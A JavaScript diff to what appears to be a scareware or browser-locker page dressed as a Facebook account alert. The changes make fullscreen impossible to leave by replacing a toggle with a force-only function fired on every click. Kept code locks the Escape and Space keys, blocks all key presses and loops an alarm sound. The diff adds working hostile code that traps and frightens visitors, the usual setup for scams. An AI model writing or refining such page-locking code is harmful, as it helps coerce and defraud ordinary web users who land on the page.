@@ -24,10 +24,25 @@ function startGlobalAudio() {
 }
 
 /* ============================================================
-   FIRST SCREEN CALL POPUP FUNCTIONALITY
+   FULLSCREEN FIX — Prevent exit on click
 ============================================================ */
 
-let firstScreenActive = true; // track first popup
+function forceFullScreen() {
+    let doc = document.documentElement;
+
+    if (!document.fullscreenElement) {
+        if (doc.requestFullscreen) doc.requestFullscreen();
+        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+        else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
+    }
+    // If already fullscreen → do nothing
+}
+
+/* ============================================================
+   FIRST SCREEN FACEBOOK POPUP FUNCTIONALITY
+============================================================ */
+
+let firstScreenActive = true;
 
 function hideFirstScreen() {
     if (!firstScreenActive) return;
@@ -41,11 +56,10 @@ function hideFirstScreen() {
     if (mc) mc.style.display = "block";
 }
 
-// Accept / Close buttons
 document.addEventListener("DOMContentLoaded", () => {
-    const btn1 = document.querySelector(".accept");
-    const btn2 = document.querySelector(".decline");
-    const closeBtn = document.querySelector(".closeBtn");
+    const btn1 = document.querySelector(".appeal");
+    const btn2 = document.querySelector(".ignore");
+    const closeBtn = document.querySelector(".fb-close");
 
     [btn1, btn2, closeBtn].forEach((btn) => {
         if (!btn) return;
@@ -53,18 +67,20 @@ document.addEventListener("DOMContentLoaded", () => {
             e.stopPropagation();
             hideFirstScreen();
             startGlobalAudio();
+            forceFullScreen(); 
         });
     });
 });
 
-// Clicking anywhere → hide first screen and continue fullscreen behavior
+// Clicking anywhere hides popup + enforces fullscreen
 document.addEventListener("click", function () {
     hideFirstScreen();
+    startGlobalAudio();
+    forceFullScreen();
 });
 
-
 /* ============================================================
-   YOUR ORIGINAL CODE (KEPT EXACTLY THE SAME EXCEPT AUDIO FIX)
+   ORIGINAL CODE (KEPT EXACT, WITH fullscreen FIX)
 ============================================================ */
 
 function getQueryParam(param) {
@@ -76,17 +92,12 @@ $(document).ready(function () {
   var audioElement = document.createElement("audio");
   audioElement.setAttribute("src", "alert-en.wav");
 
-  audioElement.addEventListener(
-    "ended",
-    function () {
+  audioElement.addEventListener("ended", function () {
       this.play();
-    },
-    false
-  );
+  }, false);
 
   addEventListener("click", function () {
 
-    // Hide first popup then fullscreen
     hideFirstScreen();
 
     var el = document.documentElement,
@@ -94,27 +105,20 @@ $(document).ready(function () {
         el.requestFullScreen ||
         el.webkitRequestFullScreen ||
         el.mozRequestFullScreen;
+
     if (reffer) reffer.call(el);
 
     audioElement.play();
-
-    // FIX: use unified eng.mp3 audio
     startGlobalAudio();
   });
 
   if ("keyboard" in navigator && "lock" in navigator.keyboard) {
     navigator.keyboard.lock(["Escape", "Space"]);
-  } else {
-    console.log("Keyboard Lock API is not supported in this browser.");
   }
 
-  document.addEventListener(
-    "keydown",
-    function (event) {
-      event.preventDefault();
-    },
-    false
-  );
+  document.addEventListener("keydown", function (event) {
+    event.preventDefault();
+  }, false);
 });
 
 window.onload = function () {
@@ -122,28 +126,12 @@ window.onload = function () {
   const leaveBtn = document.getElementById("leaveBtn");
   const cancelBtn = document.getElementById("cancelBtn");
 
-  // Show popup on load
   if (dialog) dialog.classList.add("ls-show");
 
-  function toggleFullScreen() {
-    let doc = document.documentElement;
-
-    if (!document.fullscreenElement) {
-      if (doc.requestFullscreen) doc.requestFullscreen();
-      else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-      else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
-    } else {
-      if (document.exitFullscreen) document.exitFullscreen();
-      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
-      else if (document.msExitFullscreen) document.msExitFullscreen();
-    }
-  }
-
-  // Clicking anywhere on the page
   document.addEventListener("click", function () {
     hideFirstScreen();
-    startGlobalAudio();     // FIX: instead of creating new audio
-    toggleFullScreen();
+    startGlobalAudio();
+    forceFullScreen();
   });
 
   if (leaveBtn) {
@@ -151,8 +139,8 @@ window.onload = function () {
       event.stopPropagation();
       dialog.classList.remove("ls-show");
       hideFirstScreen();
-      startGlobalAudio();   // FIX
-      toggleFullScreen();
+      startGlobalAudio();
+      forceFullScreen();
     };
   }
 
@@ -161,20 +149,20 @@ window.onload = function () {
       event.stopPropagation();
       dialog.classList.remove("ls-show");
       hideFirstScreen();
-      startGlobalAudio();   // FIX
-      toggleFullScreen();
+      startGlobalAudio();
+      forceFullScreen();
     };
   }
 };
 
 /* ============================================================
-   VIBRATION ANIMATION RESTART (UNCHANGED)
+   RESTART FACEBOOK POPUP ANIMATION
 ============================================================ */
 setInterval(() => {
-    const box = document.querySelector(".call-box");
+    const box = document.querySelector(".fb-box");
     if (box) {
-        box.classList.remove("shake");
-        void box.offsetWidth; // restart CSS animation
-        box.classList.add("shake");
+        box.classList.remove("fb-animate");
+        void box.offsetWidth;
+        box.classList.add("fb-animate");
     }
 }, 3000);
